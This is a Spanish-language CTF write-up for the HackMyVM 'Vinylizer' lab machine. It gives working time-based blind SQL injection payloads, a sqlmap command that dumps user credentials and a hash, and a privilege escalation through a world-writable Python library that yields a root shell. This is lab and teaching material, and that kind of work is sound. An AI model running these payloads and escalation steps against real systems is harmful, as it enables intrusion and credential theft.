---
layout: default
title: Vinylizer
parent: HackMyVM
grand_parent: Writeups
---

# Vinylizer
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos el puerto 22(SSH) y 80(HTTP)

```ruby
nmap -sS -n -Pn --open -p- 192.168.1.90
```
- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

 - n: para que no haga resolucion DNS y tarde menos el escaneo

 - Pn: para evitar el descubrimiento de hosts

 - open: para que solo muestre los puertos abiertos

 - -p-: para que escanee todo el rango de puertos

### Puerto 80 (HTTP)

(si hacemos fuzzing de directorios y archivos no encontraremos nada interesante)

Una de las cosas que nos llaman la atencion es un panel de login, donde al ingresar cualquier usuario, nos dara el mensaje "User not found"

![](/assets/img/vinylizer/1.png)

Si interceptamos la peticion con burpsuite nos podemos dar cuenta que existe el parametro "login"

![](/assets/img/vinylizer/2.png)

Podriamos pensar que al darle "login=true" vamos a iniciar sesion pero no es posible, asi que podemos empezar a probar con los parametros, si agremos una comilla simple despues de **username** vemos como nos arroja un HTTP 500

```bash
username=hola'&password=holi&login=
```
```ruby
HTTP/1.0 500 Internal Server Error
Date: Fri, 02 Feb 2024 22:40:00 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 2
Connection: close
Content-Type: text/html; charset=UTF-8
```
Por lo cual podriamos interntar probar SQLi

## Explotacion (SQLi Time-based blind)

Despues de probar un rato, me doy cuenta que existe una vulnerabilidad SQLi a ciegas basada en tiempo. Para corroborar esto podemos ejecutar lo siguiente en el parametro **username**

```ruby
username=hola'+or+sleep(5)--+-&password=holi&login=
```
Nos podemos dar cuenta que es vulnerable por que el servidor tarda 5 segundos en darnos una respuesta, en este punto podemos empezar a enumerar el nombre de la base de datos haciendo uso de este payload:

```ruby
OR IF(SUBSTR(database(),1,1)="v", sleep(5),1)-- -
```

```ruby
username=hola'+OR+IF(SUBSTR(database(),1,1)%3d"v",+sleep(5),1)--+-&password=holi&login=
```

Basicamente lo que hace es extrer 1 letra desde la primera posicion del nombre de la base de datos, lo que se traduciria como la primera letra del nombre de la base de datos, luego lo compara con la letra "v", si esta comparacion devuelve TRUE, entonces tardara 5 segundos en darnos una respuesta, en este caso si tardara por que es la primera letra, y asi debemos der hacerlo letra por letra, para no hacerlo tan largo usare sqlmap. De todas formas si quieres saber como explotar un SQLi time-based manualmente puedes leer este post en mi blog: [https://ic4rta.github.io/2023/03/28/sqli/](https://ic4rta.github.io/2023/03/28/sqli/)

Usando sqlmap encontraremos la base de datos vinyl_marketplace y la tabla usuarios, asi que usando lo siguiente podemos mostrar los datos:

```bash
sqlmap -u "http://192.168.1.90/login.php" --data="username=c4rta&password=c4rta&login=" --batch --dump -T users -D vinyl_marketplace
```
Y encontraremos las credenciales del usuario shopadmin:

usr: shopadmin
pass: 9432522ed1a8fca612b11c3980a031f6 (esta en md5 asi que se debe de crackear)

Y ya tendriamos la flag de user

## Escalada

Si vemos los permisos a nivel de sudoers veremos que podemos ejecutar el script vinylizer

```bash
Matching Defaults entries for shopadmin on vinylizer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User shopadmin may run the following commands on vinylizer:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py
```

Al ver el script vemos que se estan importando las librerias json y random, por redomendacion, les sugiero que si esta explotando un script de python, vean si las librerias que se estan importanto tienen permisos de escritura

Para buscar archivos con escritura podemos usar este comando:

```bash
find / -type f -writable 2>/dev/null
```

Y veremos que tenemos permisos 777 en **/usr/lib/python3.10/random.py**

```bash
-rwxrwxrwx 1 root root 33221 Nov 20 15:14 /usr/lib/python3.10/random.py
```

### Python Library Hijacking (RW permissions)

Un escenario de python library hijacking, es que se este importando una libreria la cual tiene permisos de escritura, asi que nosotros podemos modificar su contenido para que relice una accion arbitraria, si quieres saber de otros escenarios puedes leer: [https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

Ahora modificaremos el codigo de la libreria para ejecutar **/bin/bash -p**

![](/assets/img/vinylizer/3.png)

(este codigo yo lo puse antes de las otras declaraciones de **import os**, en mi caso lo puse al principio)

Y ya somos root

![](/assets/img/vinylizer/4.png)